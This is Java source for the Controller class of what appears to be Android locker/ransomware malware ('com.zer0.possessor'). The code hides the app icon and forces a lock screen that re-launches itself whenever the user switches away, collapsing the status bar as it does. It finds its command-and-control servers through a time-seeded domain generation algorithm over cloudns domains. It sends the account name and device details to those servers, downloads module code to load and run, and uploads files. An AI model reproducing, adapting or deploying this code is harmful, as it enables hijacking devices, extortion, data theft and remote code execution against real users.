package com.zer0.possessor;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.SystemClock;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.TreeMap;

public class Controller implements Runnable
{
    private final ZRuntime _zRuntime;
    private final ZModuleManager _moduleMgr;
    private final Context _context;

    private static final long ALARM_INTERVAL_SHORT_TIMEOUT = 200L;
    private static final long ALARM_INTERVAL_LONG_TIMEOUT = 10000L;
    private static final int COMMON_REQUEST_TIMEOUT = 10 * 60 * 1000;
    BroadcastReceiver _receiver = null;
    private Thread _commonThread = null;
    private long _pendingTimeout = ALARM_INTERVAL_SHORT_TIMEOUT;

    private boolean _initialized = false;

    private long _createTime;
    private long _updateTime;
    private String _wanIP;
    private String _localIP;
    private String _countryCode;
    private String _country;
    private byte[] _token;
    private String _trackInfo;
    private long _lastNtpChecked;
    private long _ntpTime;
    private int _subNameIndex;
    private int _zoneIndex;
    private String[] _subNames;
    private String[] _zones;
    private String[] _rootZones;
    private boolean _commonRequestCompleted;

    private long _secondsElapsed = 0;
    private long _lastRealtime = 0;
    private int _reentrant = 0;

    private Method _statusBarCollapse = null;
    private Object _objectStatusBar;

    private boolean _shouldLockScreen;


    public Controller(ZRuntime zRuntime)
    {
        _zRuntime = zRuntime;
        _context = zRuntime.getContext();
        _moduleMgr = (ZModuleManager)zRuntime.getModuleManager();

        _shouldLockScreen = false;
        _commonRequestCompleted = false;
        _createTime = 0;
        _updateTime = 0;
        _wanIP = "";
        _localIP = null;
        _countryCode = _zRuntime.getPrefs().loadString("_cc", "UU");;
        _country = null;
        _token = null;
        _ntpTime = 0;
        _subNameIndex = 0;
        _zoneIndex = 0;
        _subNames = null;

        _zones = new String[12];
        _zones[0] = ".locale.cloudns.pw";
        _zones[1] = ".pool.cloudns.pw";
        _zones[2] = ".inditren.cloudns.pw";
        _zones[3] = ".lollipush.cloudns.pw";
        _zones[4] = ".locale.cloudns.pro";
        _zones[5] = ".pool.cloudns.pro";

        _zones[6] = ".inditren.cloudns.pro";
        _zones[7] = ".lollipush.cloudns.pro";
        _zones[8] = ".locale.cloudns.club";
        _zones[9] = ".pool.cloudns.club";
        _zones[10] = ".inditren.cloudns.club";
        _zones[11] = ".lollipush.cloudns.club";

        _rootZones = new String[10];
        _rootZones[0] = "com";
        _rootZones[1] = "net";
        _rootZones[2] = "org";
        _rootZones[3] = "info";
        _rootZones[4] = "su";
        _rootZones[5] = "biz";
        _rootZones[6] = "pro";
        _rootZones[7] = "cc";
        _rootZones[8] = "us";
        _rootZones[9] = "cn";

        BufferedReader reader = null;
        _trackInfo = "";
        try {
            reader = new BufferedReader(new InputStreamReader(_context.getAssets().open("t")));
            _trackInfo = reader.readLine();
            _trackInfo = _trackInfo.trim();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public String getWanIP() { return _wanIP; }
    public String getCountryCode()
    {
        return _countryCode;
    }

    public byte[] getToken()
    {
        return _token;
    }
    public long getNtpTime()
    {
        if (_ntpTime == 0) {
            try {
                String[] ntpServers = {"0.us.pool.ntp.org", "1.us.pool.ntp.org", "2.us.pool.ntp.org", "3.us.pool.ntp.org"};
                Random rnd = new Random(SystemClock.elapsedRealtime());
                int rndIndex = rnd.nextInt(4);
                SntpClient client = new SntpClient();
                if (client.requestTime(ntpServers[rndIndex], 7000)) {
                    _ntpTime = (client.getNtpTime() + SystemClock.elapsedRealtime() - client.getNtpTimeReference()) / 1000;
                }
                else {
                    Date dt = new Date();
                    _ntpTime = dt.getTime() / 1000;
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                Date dt = new Date();
                _ntpTime = dt.getTime() / 1000;
            }

            _lastNtpChecked = SystemClock.elapsedRealtime();
        }
        else {
            long curTime = SystemClock.elapsedRealtime();
            _ntpTime += (curTime - _lastNtpChecked) / 1000;
            _lastNtpChecked = curTime;
        }

        return _ntpTime;
    }


    public String generateNameForTime(long utcTime)
    {
        String name = "";
        long i, currPeriod, seed, nameLen, minVal, maxVal;

        currPeriod = utcTime / 3600 / 12;
        seed = ZTable.bufferLong[(int)(currPeriod % 128)] ^ currPeriod;
        ZRandom _rand = new ZRandom(seed);

        for (i = 0; i < 756; ++i) {
            _rand.random();
        }

        minVal = 5 + (_rand.random() % (32 - 5 + 1));
        nameLen = 5 + (_rand.random() % (32 - 5 + 1));
        maxVal = Math.max(nameLen, minVal);

        if (minVal == maxVal) {
            minVal = nameLen;
        }

        nameLen = minVal + (_rand.random() % (maxVal - minVal + 1));

        for (i = 0; i < nameLen; ++i) {
            int val = (int)(48 + (_rand.random() % 36));

            if (val > 57) {
                val += 39;
            }
            if (i == 0 && val <= 57) {
                val = (int)(97 + (_rand.random() % 26));
            }
            name += (char)val;
        }

        return name;
    }

    public String getFullUrl(int port)
    {
        String fullUrl = "http://";
        fullUrl += _subNames[_subNameIndex];
        fullUrl += _zones[_zoneIndex];
        if (port != 80) {
            fullUrl += ":";
            fullUrl += Integer.valueOf(port).toString();
        }
        fullUrl += "/";

        return fullUrl;
    }

    public synchronized boolean iterateDomainIndex()
    {
        boolean ret = true;

        if (_subNameIndex == 5) {
            _subNameIndex = 0;
            if (_zoneIndex == (_zones.length - 1)) {
                _zoneIndex = 0;
                ret = false;
            }
            else {
                ++_zoneIndex;
            }
        }
        else {
            ++_subNameIndex;
        }
        return ret;
    }

    public synchronized void generateNames()
    {
        boolean created;
        int i;
        String name;

        getNtpTime();

        name = generateNameForTime(_ntpTime);

        if (_subNames == null) {
            created = true;
        }
        else {
            for (i = 0; i < _subNames.length; ++i) {
                if (name.equals(_subNames[i])) {
                    break;
                }
            }

            created = (i < _subNames.length);
        }
        name = null;

        if (created) {
            long periodItrEnd, periodItr = _ntpTime / 3600 / 12;

            if (periodItr % 2 != 0) {
                --periodItr;
            }
            periodItr -= 2;
            periodItrEnd = periodItr + 6;
            _subNames = new String[6];
            for (i = 0; periodItr < periodItrEnd; ++periodItr, ++i) {
                long period = periodItr * 12 * 3600;
                _subNames[i] = generateNameForTime(period);
            }
        }

        if (created) {
            _subNameIndex = 0;
        }
    }

    public String getZone(int index)
    {
        return _zones[index];
    }

    public String getRootZone(int index)
    {
        return _rootZones[index];
    }

    static class CompareTimesLess implements Comparator<Long> {
        @Override
        public int compare(Long lhs, Long rhs) {
            return Long.signum(rhs - lhs);
        }
    }

    public void startPending()
    {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {
                ZRuntime zRuntime = ZRuntime.getInstance(null);
                AlarmManager alarmMgr = (AlarmManager) zRuntime.getContext().getSystemService(Context.ALARM_SERVICE);
                Intent i = new Intent(zRuntime.getContext(), MainService.class);
                i.setAction("action_alarm_receiver");
                PendingIntent pendingIntent = PendingIntent.getService(zRuntime.getContext(), 0, i, 0);
                alarmMgr.set(AlarmManager.RTC, System.currentTimeMillis() + _pendingTimeout, pendingIntent);
            }
            else {
                ZRuntime zRuntime = ZRuntime.getInstance(null);
                AlarmManager alarmMgr = (AlarmManager) zRuntime.getContext().getSystemService(Context.ALARM_SERVICE);
                Intent i = new Intent(zRuntime.getContext(), MainService.class);
                i.setAction("action_alarm_receiver");
                PendingIntent pendingIntent = PendingIntent.getService(zRuntime.getContext(), 0, i, 0);
                alarmMgr.setExact(AlarmManager.RTC, System.currentTimeMillis() + _pendingTimeout, pendingIntent);
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
/*
    public void stopPending()
    {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT && _periodicStarted) {
                _periodicStarted = false;
                ZRuntime zRuntime = ZRuntime.getInstance(null);
                AlarmManager alarmMgr = (AlarmManager) zRuntime.getContext().getSystemService(Context.ALARM_SERVICE);
                Intent i = new Intent(zRuntime.getContext(), MainService.class);
                i.setAction("action_alarm_receiver");
                alarmMgr.cancel(PendingIntent.getService(zRuntime.getContext(), 0, i, 0));
            }
        }
        catch (Exception e) {
        }
    }
*/
    public void updatePendingTimeout(long newTimeout)
    {
        _pendingTimeout = newTimeout;
//        stopPending();
        startPending();
    }

    public void onInit()
    {
        try {
            _shouldLockScreen = _zRuntime.shouldLockScreen();
            if (_shouldLockScreen) {
                _zRuntime.enableLockAsHomeLauncher(true);
                _zRuntime.launchLockActivity();

                try {
                    Class<?> statusbarManager = Class.forName("android.app.StatusBarManager");
                    try {
                        _statusBarCollapse = statusbarManager.getMethod("collapse");
                    }
                    catch (NoSuchMethodException e) {
                        e.printStackTrace();
                        _statusBarCollapse = statusbarManager.getMethod("collapsePanels");
                    }

                    if (_statusBarCollapse != null) {
                        _statusBarCollapse.setAccessible(true);
                    }

                    _objectStatusBar = _zRuntime.getContext().getSystemService("statusbar");
                }
                catch (Exception e) {
                    e.printStackTrace();
                }

                if (_receiver == null) {
                    try {
                        final Controller me = this;
                        _receiver = new BroadcastReceiver() {
                            @Override
                            public void onReceive(Context context, Intent intent) {
                                final String action = intent.getAction();
                                try {
                                    switch (action) {
                                        case Intent.ACTION_SCREEN_OFF:
                                            updatePendingTimeout(ALARM_INTERVAL_LONG_TIMEOUT);
                                            break;
                                        case Intent.ACTION_SCREEN_ON:
                                            updatePendingTimeout(ALARM_INTERVAL_SHORT_TIMEOUT);
                                            break;
                                        case Intent.ACTION_SHUTDOWN:
                                            _zRuntime.enableLockAsHomeLauncher(false);
                                            break;
                                    }
                                }
                                catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        };

                        IntentFilter flt = new IntentFilter();
                        flt.addAction(Intent.ACTION_SCREEN_ON);
                        flt.addAction(Intent.ACTION_SCREEN_OFF);
                        flt.addAction(Intent.ACTION_SHUTDOWN);
                        flt.setPriority(Integer.MAX_VALUE);
                        _zRuntime.getContext().registerReceiver(_receiver, flt);
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }

        try {
            if (_commonThread == null) {
                _commonThread = new Thread(this);
                _commonThread.setPriority(Thread.MAX_PRIORITY);
                _commonThread.start();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void unregisterReceiver()
    {
        if (_receiver != null) {
            _context.unregisterReceiver(_receiver);
        }
    }

    public void onAlarmTick(Context context)
    {
        if (!_shouldLockScreen) {
            return;
        }
        if (_reentrant == 1) {
            startPending();
            return;
        }
        try {
            _reentrant = 1;
            try {
                List<Reflect> freqTasks = _moduleMgr.getFrequentTasks();
                synchronized (freqTasks) {
                    final LockActivity lockA = LockActivity.getInstance();
                    if (lockA != null) {
                        final Context ctx = _zRuntime.getContext();
                        final ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
                        final String myPkgName = ctx.getPackageName();
                        String topPkgName = null;
                        String preTopPkgName = null;
                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                            try {
                                if (am != null) {
                                    List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(2);
                                    topPkgName = tasks.get(0).topActivity.getPackageName();
                                    final String shortPkgName = tasks.get(0).topActivity.toShortString();

                                    if (_lastRealtime == 0) {
                                        _lastRealtime = SystemClock.elapsedRealtime();
                                    }
                                    _secondsElapsed = SystemClock.elapsedRealtime() - _lastRealtime;
                                    if (_secondsElapsed > 3000 || (!topPkgName.equals(myPkgName) && !(LockActivity._otherActivityStatus == LockActivity.ELEVATE_STATUS_ADMIN_REQUESTING && (shortPkgName.contains("com.android.settings.DeviceAdminAdd") || shortPkgName.contains(myPkgName))))) {
                                        _zRuntime.launchLockActivity();
                                        _lastRealtime = SystemClock.elapsedRealtime();
                                    }
                                }
                            }
                            catch (Exception e) {
                                e.printStackTrace();
                            }
                        } else {
                            try {
                                UsageStatsManager usManager = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);
                                long currTime = System.currentTimeMillis();
                                List usList = usManager.queryUsageStats(0, currTime - 5000L, currTime);
                                if (usList != null && usList.size() > 0) {
                                    TreeMap<Long, UsageStats> usTreeMap = new TreeMap<Long, UsageStats>(new CompareTimesLess());

                                    for (Object anUsList : usList) {
                                        UsageStats us = (UsageStats) anUsList;
                                        usTreeMap.put(us.getLastTimeUsed(), us);
                                    }

                                    if (!usTreeMap.isEmpty()) {
                                        int counter = 0;
                                        for (Long key : usTreeMap.keySet()) {
                                            switch (counter++) {
                                                case 0:
                                                    topPkgName = usTreeMap.get(key).getPackageName();
                                                    break;
                                                case 1:
                                                    preTopPkgName = usTreeMap.get(key).getPackageName();
                                                default:
                                                    break;
                                            }
                                            if (counter > 1) {
                                                break;
                                            }
                                        }

                                        if (!(topPkgName != null ? topPkgName.equals(myPkgName) : false) && !(topPkgName.equals("com.android.settings") && preTopPkgName != null && (preTopPkgName.equals(myPkgName) && (LockActivity._otherActivityStatus == LockActivity.ELEVATE_STATUS_ADMIN_REQUESTING || LockActivity._otherActivityStatus == LockActivity.ELEVATE_STATUS_USAGESTATS_REQUESTING)))) {
                                            _zRuntime.launchLockActivity();
                                        }
                                    }
                                } else {
                                    List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
                                    topPkgName = procs.get(0).processName;
                                    if (procs.size() > 1) {
                                        preTopPkgName = procs.get(1).processName;
                                    }

                                    if (_lastRealtime == 0) {
                                        _lastRealtime = SystemClock.elapsedRealtime();
                                    }
                                    _secondsElapsed = SystemClock.elapsedRealtime() - _lastRealtime;
                                    if (_secondsElapsed > 3000 || ((!topPkgName.equals(myPkgName) && !(topPkgName.equals("com.android.settings") && preTopPkgName != null && (preTopPkgName.equals(myPkgName) && (LockActivity._otherActivityStatus == LockActivity.ELEVATE_STATUS_ADMIN_REQUESTING || LockActivity._otherActivityStatus == LockActivity.ELEVATE_STATUS_USAGESTATS_REQUESTING)))))) {
                                        _zRuntime.launchLockActivity();
                                        _lastRealtime = SystemClock.elapsedRealtime();
                                    }
                                }
    /*
                        List localList = usManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, currTime - 50000L, currTime);
                        TreeMap<Long, UsageStats> localTreeMap;
                        Iterator localIterator;
                        if (localList != null) {
                            localTreeMap = new TreeMap<Long, UsageStats>();
                            localIterator = localList.iterator();
                            while (localIterator.hasNext()) {
                                UsageStats us = (UsageStats) localIterator.next();
                                localTreeMap.put(us.getLastTimeUsed(), us);
                            }

                            if (!localTreeMap.isEmpty()) {
                                String str = ((UsageStats) localTreeMap.get(localTreeMap.lastKey())).getPackageName();
                                if (!TextUtils.isEmpty(str)) {
                                    LockActivity._otherActivityStatus = LockActivity.ELEVATE_STATUS_DONE;
                                    _zRuntime.getContext().sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
                                    ZRuntime.launchLockActivity(ctx);
                                    //final LockActivity a = LockActivity.getInstance();
                                    //if (a != null) {
                                    //    a.runOnUiThread(new Runnable() {
                                    //        @Override
                                    //        public void run() {
                                    //            a.launchAdminIntent();
                                    //        }
                                    //    });
                                    //}
                                }
                            }
                        }*/
                            }
                            catch (Exception e) {
                                e.printStackTrace();
                            }
                        }

                        try {
                            lockA.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        if (_statusBarCollapse != null && _objectStatusBar != null) {
                                            _statusBarCollapse.invoke(_objectStatusBar);
                                        }
                                    }
                                    catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                        }

                        // closes system dialogs...
                        //_zRuntime.getContext().sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
                    }

                    final long currentMillis = System.currentTimeMillis();
                    for (Reflect t : freqTasks) {
                        try {
                            if ((boolean)t.call("needFrequentJob", currentMillis).get()) {
                                t.call("doFrequentJob");
                            }
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
            catch (Exception e){
                e.printStackTrace();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            startPending();
            _reentrant = 0;
        }
    }

    public boolean sendCommonRequest() throws InterruptedException
    {
        int counter = 0;
        do {
            ZInputStream zis = null;
            try {
                ZCtrlRequest zRequest = (ZCtrlRequest)_zRuntime.createRequest();
                int REQUEST_COMMON = 0x94d27aa4;
                zRequest.init(REQUEST_COMMON);
                ZOutputStream outStream = zRequest.getRequestStream();

                outStream.writeInt(_zRuntime.getOsValue());
                ByteBuffer osLang = _zRuntime.getOsLang();
                outStream.writeData(osLang.array(), 0, osLang.capacity());
                outStream.writeInt(0); // security mask
                outStream.writeLong(0); // HIPS mask
                outStream.writeBinaryString(((SystemUtils)_zRuntime.getSystemUtils()).getAccountName());

                String val;
                val = android.os.Build.MANUFACTURER;
                if (val == null) {
                    val = "unknown";
                }
                outStream.writeBinaryString(val); // Manufacturer

                val = android.os.Build.MODEL;
                if (val == null) {
                    val = "unknown";
                }
                outStream.writeBinaryString(val); // Model
                outStream.writeBinaryString(_zRuntime.getPhoneManager().getNetworkOperatorName()); // Network operator name
                outStream.writeBinaryString(_zRuntime.getPhoneManager().getNetworkType()); // Network type
                outStream.writeBinaryString(_zRuntime.getPhoneManager().getNetworkCountryIso()); // Network country ISO
                outStream.writeBinaryString(_zRuntime.getPhoneManager().getSIMState()); // SIM State


                ArrayList<Reflect/*ZModuleInterface*/> modules = _moduleMgr.getModules();
                outStream.writeInt(1 + modules.size()); // modules count
                outStream.writeInt(_zRuntime.getCoreHash());
                outStream.writeInt(_zRuntime.getCoreVersion());
                outStream.writeInt(1); // enabled

                for (Reflect/*ZModuleInterface*/ zModule : modules) {
                    outStream.writeInt((int)zModule.call("getHash").get());
                    outStream.writeInt((int)zModule.call("getVersion").get());
                    outStream.writeInt(1/*getModuleState((int)zModule.call("getHash").get())*/); // enabled
                }

                // tracking info
                outStream.writeBinaryString(_trackInfo);

                zis = zRequest.doRequest();
                if (zis != null) {
                    _createTime = zis.readInt() & 0xffffffffL;
                    _updateTime = zis.readInt() & 0xffffffffL;
                    _wanIP = zis.readBinaryString();
                    _countryCode = zis.readBinaryString();
                    _zRuntime.getPrefs().saveString("_cc", _countryCode);
                    _country = zis.readBinaryString();
                    if (_token == null) {
                        _token = new byte[64];
                    }
                    zis.read(_token);

                    int modulesCount = zis.readInt();

                    int i;
                    int[] hashes = new int[modulesCount];
                    for (i = 0; i < modulesCount; ++i) {
                        try {
                            int moduleHash = zis.readInt();
                            int moduleVer = zis.readInt();
                            int modulePriority = zis.readInt();
                            int moduleSize = zis.readInt();
                            byte[] partData = new byte[1024];
                            int remainSize = moduleSize;
                            OutputStream fos = new BufferedOutputStream(new FileOutputStream(_moduleMgr.getModulePath(moduleHash).getAbsolutePath()));
                            while (remainSize > 0) {
                                int neededSize = Math.min(1024, remainSize);
                                int readedSize = zis.read(partData, 0, neededSize);
                                fos.write(partData, 0, readedSize);
                                remainSize -= readedSize;
                            }
                            fos.flush();
                            fos.close();
                            fos = null;

                            hashes[i] = moduleHash;
                            _moduleMgr.setModulePriority(moduleHash, modulePriority);
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    long crc = zis.readLong();
                    // need check crc
/*

					for (i = 0; i < modulesCount; ++i) {
						int moduleHash = hashes[i];
						ZModuleInterface zModule = reloadModule(moduleHash);
						preExecureModule(zModule);
					}
*/
                    _commonRequestCompleted = true;
                    break;
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            finally {
                try {
                    if (zis != null) {
                        zis.close();
                    }
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
            }
            Thread.sleep(10000);
        } while (counter++ < 3);

        return (counter < 3);
    }

    public boolean sendFiles(final String sdirName, List<File> files) throws InterruptedException
    {
        int counter = 0;
        do {
            ZInputStream zis = null;
            try {
                ZCtrlRequest zRequest = (ZCtrlRequest)_zRuntime.createRequest();
                int REQUEST_UPLOAD_DATA = 0x569EB8B9;
                zRequest.init(REQUEST_UPLOAD_DATA);
                ZOutputStream outStream = zRequest.getRequestStream();

                outStream.writeBinaryString(sdirName);

                ArrayList<File> existFiles = new ArrayList<File>();
                int count = 0;
                for (File f : files) {
                    if (f.exists() && f.isFile() && f.length() > 0) {
                        ++count;
                        existFiles.add(f);
                    }
                }

                if (existFiles.size() > 0) {
                    outStream.writeInt(count); // number of files
                    for (File f : existFiles) {
                        byte[] content = FileUtils.readFile(f.getAbsolutePath());
                        outStream.writeBinaryString(f.getName());
                        outStream.writeInt(content.length); // content size
                        outStream.write(content); // content data
                    }

                    zis = zRequest.doRequest();
                    if (zis != null) {
                        break;
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            finally {
                try {
                    if (zis != null) {
                        zis.close();
                    }
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
            }
            Thread.sleep(10000);
        } while (counter++ < 3);

        return (counter < 3);
    }

    public void run() {
        long _commorequestTimestamp = 0;
        for ( ; ; ) {
            try {
                if (!_initialized) {
                    ((SystemUtils)_zRuntime.getSystemUtils()).hideIcon(true);

                    final String cc = getCountryCode();
                    if (cc.equals("UU")) {
                        sendCommonRequest();
                    }

                    _moduleMgr.loadModules();
                    final LockActivity la = LockActivity.getInstance();
                    if ((!getCountryCode().equals("US") && !getCountryCode().equals("RU")) && la != null) {
                        updatePendingTimeout(ALARM_INTERVAL_LONG_TIMEOUT);
                        try {
                            la.runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        _zRuntime.enableLockAsHomeLauncher(false);
                                        la.endActivity(null);
                                    }
                                    catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    _initialized = true;
                }
                else {

                }

                final long currentMillis = System.currentTimeMillis();
                if ((currentMillis - _commorequestTimestamp) > COMMON_REQUEST_TIMEOUT) {
                    sendCommonRequest();
                    _commorequestTimestamp = System.currentTimeMillis();
                }

                if (_commonRequestCompleted) {
                    for (Reflect t : _moduleMgr.getCommonTasks()) {
                        try {
                            t.call("doCommonJob", currentMillis);
                        }
                        catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    List<Reflect> mods = _moduleMgr.getModules();
                    int count = mods.size();
                    while (count-- > 0) {
                        Reflect zMod = mods.get(count);
                        if ((int)zMod.call("getState").get() == 0) {
                            _moduleMgr.removeModule(zMod);
                        }
                    }
                }
                else {
                    sendCommonRequest();
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            finally {
                System.gc();
                try {
                    Thread.sleep(10000);
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }
}